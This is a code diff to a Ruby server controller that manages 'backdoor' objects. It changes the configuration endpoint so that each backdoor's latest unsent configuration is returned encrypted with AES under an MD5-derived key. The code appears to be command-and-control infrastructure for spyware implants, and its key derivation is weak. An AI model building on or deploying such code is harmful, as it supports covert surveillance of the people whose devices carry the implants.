@@ -1,11 +1,13 @@
 #
 # Controller for the Backdoor objects
 #
+require 'rcs-common/crypt'
 
 module RCS
 module DB
 
 class BackdoorController < RESTController
+  include RCS::Crypt
 
   # retrieve the class key of the backdoors
   # if the parameter is specified, it take only that class
@@ -49,9 +51,14 @@ class BackdoorController < RESTController
   def config
     case @req_method
       when 'GET'
-        content = DB.instance.backdoor_config(params['backdoor'])
-        return STATUS_NOT_FOUND if content.nil?
-        return STATUS_OK, content, 'binary/octet-stream'
+        backdoor = Item.where({_kind: 'backdoor', _mid: params['backdoor'].to_i}).first
+        config = backdoor.configs.where(:sent.exists => false).last
+        return STATUS_NOT_FOUND if config.nil?
+
+        # encrypt the config for the backdoor using the confkey
+        enc_content = aes_encrypt(config[:config], Digest::MD5.digest(backdoor[:confkey]))
+
+        return STATUS_OK, enc_content, 'binary/octet-stream'
       when 'PUT'
         DB.instance.backdoor_config_sent(params['backdoor'])
         trace :info, "[#{@req_peer}] Configuration sent [#{params['backdoor']}]"
